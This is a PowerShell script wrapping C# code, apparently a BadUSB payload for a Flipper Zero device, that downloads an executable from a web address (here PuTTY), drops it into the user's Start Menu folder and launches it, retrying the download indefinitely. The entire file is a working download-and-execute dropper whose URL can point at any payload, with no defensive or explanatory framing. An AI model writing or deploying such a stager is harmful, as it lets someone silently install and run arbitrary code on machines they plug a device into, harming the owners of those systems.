$code = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace Flipper
{
    public class BadUSB
    {
        public void Run()
        {
            Thread.Sleep(2500);
            byte[] Payload = DownloadPayload("https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe");
			
            if (InstallPayload(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + "\\putty.exe", Payload))
            {
            }
        }
		
        public byte[] DownloadPayload(string url)
        {
        re:
            try
            {
                using (WebClient wc = new WebClient())
                {
                    return wc.DownloadData(url);
                }
            }
            catch
            {
                Thread.Sleep(5000);
                goto re;
            }
        }
		
        public bool InstallPayload(string dropPath, byte[] payloadBuffer)
        {
            if (!Process.GetCurrentProcess().MainModule.FileName.Equals(dropPath, StringComparison.CurrentCultureIgnoreCase))
            {
                FileStream FS = null;
                try
                {
                    if (!File.Exists(dropPath))
                        FS = new FileStream(dropPath, FileMode.CreateNew);
                    else
                        FS = new FileStream(dropPath, FileMode.Create);
                    FS.Write(payloadBuffer, 0, payloadBuffer.Length);
                    FS.Dispose();
                    Process.Start(dropPath);
                    return true;
                }
                catch
                {
                    return false;
                }
            }
            return false;
        }
		
    }
}

"@

Add-Type -TypeDefinition $code;
$instance = New-Object Flipper.BadUSB;
$instance.Run();
